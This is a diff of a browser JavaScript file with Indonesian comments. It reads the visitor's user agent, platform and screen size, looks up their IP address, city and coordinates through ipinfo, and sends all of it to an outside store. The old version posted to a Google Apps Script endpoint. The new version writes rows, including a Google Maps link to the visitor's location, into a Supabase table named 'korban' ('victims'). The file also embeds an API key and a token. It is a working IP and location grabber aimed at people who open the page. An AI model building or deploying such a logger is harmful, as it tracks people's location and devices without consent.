@@ -1,53 +1,44 @@
-// Ambil info dari browser
-const userAgent = navigator.userAgent;
-let platform = "Unknown";
+import { createClient } from 'https://esm.sh/@supabase/supabase-js'
 
-if (navigator.userAgentData && navigator.userAgentData.platform) {
-  platform = navigator.userAgentData.platform;
-} else {
-  platform = navigator.platform || "Unknown";
-}
+const supabase = createClient(
+  'https://ldxmkrwegqlyakffxzif.supabase.co', // ganti ini
+  'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImxkeG1rcndlZ3FseWFrZmZ4emlmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDU2NDAyMzcsImV4cCI6MjA2MTIxNjIzN30.7nY7oKtA457JxuQllX2UwREBH41bByWcbGp_L05K28I'                    // dan ini
+)
 
 // Tampilkan info perangkat
-const deviceInfo = document.getElementById("deviceInfo");
+const deviceInfo = document.getElementById("deviceInfo")
 deviceInfo.innerHTML = `
-  <strong>User Agent:</strong> ${userAgent}<br>
-  <strong>Platform:</strong> ${platform}<br>
+  <strong>User Agent:</strong> ${navigator.userAgent}<br>
+  <strong>Platform:</strong> ${navigator.platform}<br>
   <strong>Resolusi Layar:</strong> ${window.screen.width} x ${window.screen.height}
-`;
+`
 
-// Ambil data IP dan lokasi dari ipinfo
 fetch("https://ipinfo.io/json?token=8f8f1f3820adfb")
   .then((res) => res.json())
-  .then((data) => {
+  .then(async (data) => {
     document.getElementById("ipInfo").innerHTML = `
       <strong>IP Address:</strong> ${data.ip}<br>
       <strong>Kota:</strong> ${data.city}<br>
       <strong>Negara:</strong> ${data.country}<br>
       <strong>Lokasi (koordinat):</strong> ${data.loc}
-    `;
+    `
 
-    const [lat, lon] = data.loc.split(",");
-    const mapUrl = `https://maps.google.com/maps?q=${lat},${lon}&z=15&output=embed`;
-    document.getElementById("mapFrame").src = mapUrl;
+    const [lat, lon] = data.loc.split(",")
+    const mapUrl = `https://maps.google.com/maps?q=${lat},${lon}&z=15&output=embed`
+    document.getElementById("mapFrame").src = mapUrl
 
-    // Kirim data ke Google Sheets via Apps Script
-    fetch("https://script.google.com/macros/s/AKfycbxE-jKDj3LfqMNDAxout8CTCwTazIpdpWnYwRWdcc4iqSviEglxdA5F7YgDhkKTopWq/exec", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-      },
-      body: JSON.stringify({
-        ip: data.ip,
-        city: data.city,
-        country: data.country,
-        loc: data.loc,
-        user_agent: userAgent,
-        platform: platform,
-        resolution: `${window.screen.width} x ${window.screen.height}`,
-      }),
-    });
+    // Kirim ke Supabase
+    await supabase.from("korban").insert([{
+      ip: data.ip,
+      city: data.city,
+      country: data.country,
+      loc: data.loc,
+      user_agent: navigator.userAgent,
+      platform: navigator.platform,
+      resolution: `${window.screen.width} x ${window.screen.height}`,
+      maps_link: `https://maps.google.com/maps?q=${lat},${lon}&z=15`
+    }])
   })
   .catch(() => {
-    document.getElementById("ipInfo").innerHTML = "Gagal mengambil info IP.";
-  });
+    document.getElementById("ipInfo").innerHTML = "Gagal mengambil info IP."
+  })
